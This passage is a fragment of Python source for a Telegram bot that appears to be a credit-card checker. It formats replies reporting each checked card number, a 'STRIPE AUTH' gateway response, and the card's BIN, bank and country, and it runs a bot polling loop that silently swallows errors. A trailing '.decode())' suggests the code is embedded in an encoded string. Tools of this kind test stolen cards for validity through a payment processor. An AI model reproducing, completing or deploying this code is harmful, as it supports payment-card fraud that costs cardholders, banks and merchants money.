<b>Req by :</b> @{message.from_user.username}"""
                bot.reply_to(message,text=resp,parse_mode="HTML")
            else:
                resp = f""" 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐂𝐚𝐫𝐝 💳
 ┏━━━━━━━━━━━⍟
┃𝐂𝐂 <code>{cc}</code>┗━━━━━━━⊛
𝐆𝐚𝐭𝐞𝐰𝐚𝐲:  <b>STRIPE AUTH</b>  
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:  {last}
        
𝐈𝐧𝐟𝐨: {bin_number} {ca}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
𝐁𝐚𝐧𝐤: {bank}
        
𝐓𝐢𝐦𝐞: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
<b>Req by :</b> @{message.from_user.username}"""
                bot.edit_message_text(chat_id=message.chat.id,message_id=a.message_id,text=resp,parse_mode="HTML")
            
            



def run_bot():
    while True:
        try:
            print("Rocket bot starting")
            bot.polling()
        except:
            print("Error in rocket bot")

").decode())